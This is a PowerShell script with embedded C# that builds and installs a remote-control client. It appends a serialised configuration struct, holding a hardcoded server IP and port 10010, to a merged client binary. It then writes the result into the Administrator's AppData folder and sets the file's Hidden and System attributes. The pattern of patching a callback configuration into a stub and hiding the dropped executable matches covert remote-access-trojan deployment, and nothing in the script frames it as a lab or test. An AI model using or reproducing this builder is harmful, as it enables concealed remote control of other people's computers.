Add-Type -TypeDefinition @"
using System;
using System.Net;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct ClientParameters
{
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public byte[] Header;
    public long ServerIP;
    public int ServerPort;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 24)]
    public string OnlineAvatar;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 24)]
    public string ServiceName;

    public void SetServerIP(string ip)
    {
        byte[] addressBytes = IPAddress.Parse(ip).GetAddressBytes();
        this.ServerIP = (long)(uint)BitConverter.ToInt32(addressBytes, 0);
    }

    public void InitHeader()
    {
        this.Header = new byte[] { 0xff, 0xff, 0xff, 0xff };
    }
}
"@

$size = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][ClientParameters])
Write-Host "Struct size: $size bytes"

$para = New-Object ClientParameters
$para.InitHeader()
$para.SetServerIP("203.91.76.159")
$para.ServerPort = 10010
$para.OnlineAvatar = "16238_100.png"
$para.ServiceName = "RemoteControlClient.exe"

$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($size)
[System.Runtime.InteropServices.Marshal]::StructureToPtr($para, $ptr, $true)
$paraBytes = New-Object byte[] $size
[System.Runtime.InteropServices.Marshal]::Copy($ptr, $paraBytes, 0, $size)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptr)

# Use the ILMerge-combined .dat file as source
$datFile = "C:\RemoteControl-1\RemoteControl.Client\bin\Debug\RemoteControl.Client.dat"
$exeData = [System.IO.File]::ReadAllBytes($datFile)
Write-Host "Source .dat size: $($exeData.Length)"

# Copy to install location as the merged single exe
$installDir = "C:\Users\Administrator\AppData\Local\RemoteControlClient"
$destExe = Join-Path $installDir "RemoteControlClient.exe"
New-Item -ItemType Directory -Force -Path $installDir | Out-Null

# Write: data + params
$fs = [System.IO.File]::Open($destExe, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
$fs.Write($exeData, 0, $exeData.Length)
$fs.Write($paraBytes, 0, $paraBytes.Length)
$fs.Close()

# Set attributes
Set-ItemProperty $destExe -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)

Write-Host "Installed merged client to: $destExe"
Write-Host "Size: $((Get-Item $destExe -Force).Length) bytes"
